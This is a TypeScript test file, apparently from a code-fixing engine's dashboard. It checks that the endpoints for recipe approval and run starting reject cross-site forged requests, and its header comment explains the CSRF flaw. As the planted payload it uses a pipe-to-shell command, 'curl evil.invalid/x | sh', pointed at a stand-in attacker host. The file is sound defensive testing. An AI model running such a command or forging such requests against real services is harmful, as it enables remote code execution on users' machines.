// The one write in the dashboard is only accepted from its own page.
//
// Found by a security review of the pushed commits, and it was real. `POST
// /repos/<repo>/onboard` stores a recipe — **arbitrary shell commands the engine later
// executes verbatim** in a sandbox that has a package registry reachable — and it had no
// auth, no token and no origin check.
//
// Binding to `127.0.0.1` is not a defence and it is worth being precise about why, because
// it is the intuition that makes this bug easy to ship: the same-origin policy stops
// another page READING our response; it has never stopped it sending the request. A form
// POST with `application/x-www-form-urlencoded` is a CORS "simple" request, so there is no
// preflight to block it either. Any page the operator visited could have stored a recipe,
// and the next run on that repository would have executed it.
//
// The execution is not even the worst part. ADR-0013 says the approval "is the only
// control there is on a stored command we will execute" — a forged POST is a stored
// command that no human approved, so the invariant onboarding rests on was simply false.

import { afterEach, describe, expect, it, vi } from 'vitest';
import type { Db } from '../src/store.js';
import { dashboardRoutes } from '../src/routes.js';
import { startStatusServer, type StatusServer } from '../src/sse.js';

const servers: StatusServer[] = [];
afterEach(async () => {
  for (const server of servers.splice(0)) await server.close();
});

/**
 * Answers the lookups the onboarding route and the button make: the installation, then
 * the recipe (so the button reaches the queue when the origin is ours), and no open job.
 */
const client = () =>
  ({
    query: vi.fn(async (sql: string) => {
      const rows =
        typeof sql === 'string' && sql.includes('from installations')
          ? [{ repo: 'o/r', installation_id: 1, account: 'o', connected_at: new Date(), removed_at: null }]
          : typeof sql === 'string' && sql.includes('from recipes')
            ? [{ recipe: { install: 'npm ci', services: [] } }]
            : [];
      return { rows, rowCount: rows.length };
    }),
  }) as unknown as Db;

/** A GitHub that knows one issue, so a permitted press has something to queue. */
const github = {
  token: async () => 'ghs_test',
  api: 'http://github.invalid',
  fetch: (async (input: string | URL | Request) => {
    const path = new URL(String(input instanceof Request ? input.url : input)).pathname;
    return path === '/repos/o/r/issues/1'
      ? Response.json({ number: 1, title: 'broken', body: 'it is', html_url: '', labels: [], updated_at: '' })
      : new Response('not found', { status: 404 });
  }) as typeof fetch,
};

const serve = async () => {
  const server = await startStatusServer({
    read: async () => [],
    routes: dashboardRoutes({ client: client(), installUrl: 'https://example.invalid', github }),
  });
  servers.push(server);
  return `http://127.0.0.1:${server.port}`;
};

/** The recipe an attacker would plant: a command, and the engine runs commands. */
const EVIL = JSON.stringify({ install: 'curl evil.invalid/x | sh', services: [] });

const approve = (base: string, headers: Record<string, string>) =>
  fetch(`${base}/repos/o/r/onboard`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded', ...headers },
    body: new URLSearchParams({ recipe: EVIL }).toString(),
    redirect: 'manual',
  });

describe('a recipe can only be approved from our own page', () => {
  it('refuses the exact shape a malicious page can send', async () => {
    const base = await serve();
    // This is what a browser sends for `<form method=post action="http://127.0.0.1:…">`
    // on someone else's site. No preflight, no opt-in, nothing the operator sees.
    const response = await approve(base, { 'sec-fetch-site': 'cross-site', origin: 'https://evil.invalid' });

    expect(response.status).toBe(403);
    expect(await response.text()).toMatch(/cross-site/);
  });

  it('refuses a same-SITE origin too, because a subdomain is not us', async () => {
    const base = await serve();
    expect((await approve(base, { 'sec-fetch-site': 'same-site' })).status).toBe(403);
  });

  it('refuses on Origin alone, for a browser too old to send Sec-Fetch-Site', async () => {
    const base = await serve();
    expect((await approve(base, { origin: 'https://evil.invalid' })).status).toBe(403);
  });

  it('accepts our own page', async () => {
    const base = await serve();
    const response = await approve(base, { 'sec-fetch-site': 'same-origin' });
    // 303 back to the form: stored.
    expect(response.status).toBe(303);
  });

  it('accepts a request with no browser headers at all', async () => {
    // curl, the CLI, this test. Not a browser, so not forgeable cross-site — forging one
    // already requires code execution on the machine, at which point the recipe is the
    // least of it. Refusing these would break every non-browser client for no gain.
    const base = await serve();
    expect((await approve(base, {})).status).toBe(303);
  });

  it('leaves reads alone, because a projection can be rebuilt from the log', async () => {
    // The check is on writes only. A cross-site GET of a run list discloses nothing an
    // attacker could not get by asking the engine to run, and blocking it would break
    // linking to a run from anywhere.
    const base = await serve();
    const response = await fetch(`${base}/runs`, { headers: { 'sec-fetch-site': 'cross-site' } });
    expect(response.status).toBe(200);
  });
});

/**
 * The button is a write too (M10), and a JSON one.
 *
 * `POST /api/runs` queues work a worker executes against a repository. The origin check
 * above is the control, unchanged; what a JSON route adds is that its body has to SAY it
 * is JSON — the one request a browser can send with no preflight is a form, and a form
 * is never what a JSON client sends.
 */
describe('a run can only be started from our own page', () => {
  const start = (base: string, headers: Record<string, string>) =>
    fetch(`${base}/api/runs`, {
      method: 'POST',
      headers,
      body: JSON.stringify({ repo: 'o/r', issue_number: 1 }),
    });

  it('refuses a cross-site JSON post', async () => {
    const base = await serve();
    const response = await start(base, { 'content-type': 'application/json', 'sec-fetch-site': 'cross-site' });
    expect(response.status).toBe(403);
  });

  it('refuses a form that carries JSON, as the wrong kind of body', async () => {
    // `enctype=text/plain` lets a form send bytes that parse as JSON. Same origin or not,
    // the route does not read it: 415, before any lookup.
    const base = await serve();
    const response = await start(base, { 'content-type': 'text/plain', 'sec-fetch-site': 'same-origin' });
    expect(response.status).toBe(415);
  });

  it('accepts our own page', async () => {
    const base = await serve();
    const response = await start(base, { 'content-type': 'application/json', 'sec-fetch-site': 'same-origin' });
    expect(response.status).toBe(202);
  });

  it('accepts a client with no browser headers, like the CLI', async () => {
    const base = await serve();
    expect((await start(base, { 'content-type': 'application/json' })).status).toBe(202);
  });
});
